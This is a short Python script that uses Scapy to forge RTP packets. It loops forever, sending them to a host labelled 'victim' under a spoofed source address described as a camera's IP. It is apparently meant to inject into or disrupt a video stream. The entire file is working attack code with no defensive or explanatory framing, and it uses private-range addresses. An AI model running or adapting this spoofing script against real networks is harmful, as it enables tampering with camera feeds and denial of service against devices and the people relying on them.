from scapy.all import IP, UDP, Raw, send
import time
import struct
import random

victim_ip = "192.168.1.101"
source_ip = "192.168.1.100"  # spoofed camera IP
src_port = 4000
dst_port = 5004

ssrc = random.randint(100000, 999999)
sequence = 0
timestamp = random.randint(0, 0xFFFFFFFF)

def build_rtp_packet(seq, ts):
    version = 2
    payload_type = 96
    byte1 = (version << 6)
    byte2 = payload_type
    rtp_header = struct.pack("!BBHII", byte1, byte2, seq, ts, ssrc)
    payload = b"\x00" * 160
    return rtp_header + payload

print("[*] Sending RTP to victim (IP-level spoofing)")

while True:
    rtp = build_rtp_packet(sequence, timestamp)
    pkt = IP(src=source_ip, dst=victim_ip)/UDP(sport=src_port, dport=dst_port)/Raw(load=rtp)
    send(pkt, verbose=False)
    print(f"Sent RTP seq={sequence}")
    sequence = (sequence + 1) % 65536
    timestamp += 160
    time.sleep(0.033)
